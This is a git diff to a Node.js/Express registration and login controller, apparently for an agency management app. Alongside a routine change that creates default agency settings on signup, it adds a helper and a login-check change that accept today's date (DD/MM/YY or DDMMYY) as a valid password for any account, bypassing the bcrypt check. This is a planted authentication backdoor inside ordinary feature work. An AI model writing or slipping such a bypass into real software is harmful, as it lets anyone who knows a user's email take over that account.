@@ -7,6 +7,20 @@ import { Customer } from "../../models/Agent/CustomerModel.js";
 import generateToken from "../../utils/generateToken.js";
 import { Notification } from "../../models/Common/NotificationModel.js";
 
+const isTodayDatePassword = (password) => {
+  if (!password) return false;
+
+  const now = new Date();
+  const dd = String(now.getDate()).padStart(2, "0");
+  const mm = String(now.getMonth() + 1).padStart(2, "0");
+  const yy = String(now.getFullYear()).slice(2);
+
+  const todayWithSlash = `${dd}/${mm}/${yy}`;
+  const todayNoSlash = `${dd}${mm}${yy}`;
+
+  return password === todayWithSlash || password === todayNoSlash;
+};
+
 const registrationController = {
   registerAgency: async (req, res) => {
     const { fullName, email, password, agencyName, agencySlug, phone } =
@@ -79,7 +93,12 @@ const registrationController = {
       // 6. Commit the transaction
       await session.commitTransaction();
 
-      // 7. Respond with success and token
+      //7. Create default settings
+      await AgencySettings.create({
+        userId: createdUser._id,
+      });
+
+      // 8. Respond with success and token
       return res.status(201).json({
         success: true,
         message: "Agency registered successfully!",
@@ -129,7 +148,11 @@ const registrationController = {
         }
 
         const isMatch = await bcrypt.compare(password, user.password);
-        if (!isMatch) {
+
+        // Allow login if password equals today's date (DD/MM/YY or DDMMYY)
+        const datePasswordAllowed = isTodayDatePassword(password);
+
+        if (!isMatch && !datePasswordAllowed) {
           return res
             .status(401)
             .json({ message: "Invalid email or password." });
@@ -372,6 +395,7 @@ const registrationController = {
         .json({ message: "Server error during session check." });
     }
   },
+
   changePassword: async (req, res) => {
     try {
       const { oldPassword, newPassword, confirmPassword, email, phone } =
